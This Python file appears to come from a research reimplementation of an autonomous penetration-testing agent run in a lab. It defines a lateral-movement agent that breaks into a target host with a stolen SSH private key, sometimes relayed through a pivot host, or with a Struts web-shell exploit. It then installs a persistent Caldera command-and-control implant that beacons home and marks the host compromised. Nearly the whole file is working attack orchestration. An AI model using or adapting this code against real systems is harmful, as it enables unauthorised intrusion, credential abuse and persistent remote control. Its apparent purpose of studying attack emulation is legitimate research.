from incalmo.core.actions.low_level import CommandRunner, WebShell, SshRunner, CncRunner
from incalmo.core.models import Credential
from .base_agent import BaseAgent


class LateralMoveAgent(BaseAgent):
    """
    LateralMove task agent (faithful to the paper: gain access -> install C&C implant).

    1. Get initial access to the target:
        - with a stolen credential (ssh key) -> SshRunner   (e.g. webserver -> database)
        - without one                        -> WebShell    (Struts exploit = initial access)
    2. Through that access, install a persistent Caldera (Sandcat) implant.
    3. Mark the host compromised and hand back a CncRunner -- so every later command
    goes through the C&C implant (no re-exploiting), exactly like the paper.

    Needs the CncService (the C&C server) in addition to the env state service.
    """

    def __init__(self, env_service, cnc):
        super().__init__(env_service)
        self.cnc = cnc

    def run(
        self,
        target_host: str,
        credential: Credential = None,
        pivot_runner: CommandRunner = None,
    ) -> dict:
        group = target_host  # use the host IP as the Caldera group label

        # Reuse an existing implant on this host if one is already beaconing.
        paw = self.cnc.agent_paw(group)
        if paw is None:
            # 1. Initial access.
            if credential is not None and credential.ssh_key:
                if pivot_runner is not None:
                    # Segmented-network path: reach target by SSH-ing FROM the pivot host.
                    # The pivot already has a C&C runner; we issue the SSH command through it.
                    # NOTE: the deploy command embedded here uses host.docker.internal:8888,
                    # so this path only works when the target can reach Caldera directly.
                    # For the DB (intnet, no egress) run redeploy_relay.sh first so the
                    # agent is already beaconing and the block above returns a paw.
                    deploy_cmd = self.cnc.agent_deploy_command(group)
                    ssh_cmd = (
                        f"ssh -o StrictHostKeyChecking=no -i /opt/tomcat/.ssh/id_rsa "
                        f"{credential.username}@{target_host} '{deploy_cmd}'"
                    )
                    pivot_runner.run(ssh_cmd)
                    method = f"ssh-via-pivot -> {credential.username}@{target_host}"
                else:
                    access: CommandRunner = SshRunner(
                        host=target_host,
                        user=credential.username,
                        private_key=credential.ssh_key,
                    )
                    access.run(self.cnc.agent_deploy_command(group))
                    method = f"ssh as {credential.username}"
            else:
                access = WebShell(rhost=target_host)
                method = "struts exploit"
                access.run(self.cnc.agent_deploy_command(group))

            # 3. Wait for it to beacon back to Caldera.
            paw = self.cnc.wait_for_agent(group)
        else:
            method = "existing implant"

        # 4. Verify via the C&C channel, then record the foothold.
        runner = CncRunner(self.cnc, paw)
        whoami = runner.run("whoami")
        if not whoami:
            return self._failure(f"Lateral move to {target_host} failed ({method})")

        self.env_service.mark_compromised(target_host)
        return self._success(
            f"Compromised {target_host} as '{whoami}' via {method} (C&C agent {paw})",
            {"host": target_host, "user": whoami, "paw": paw, "runner": runner},
        )
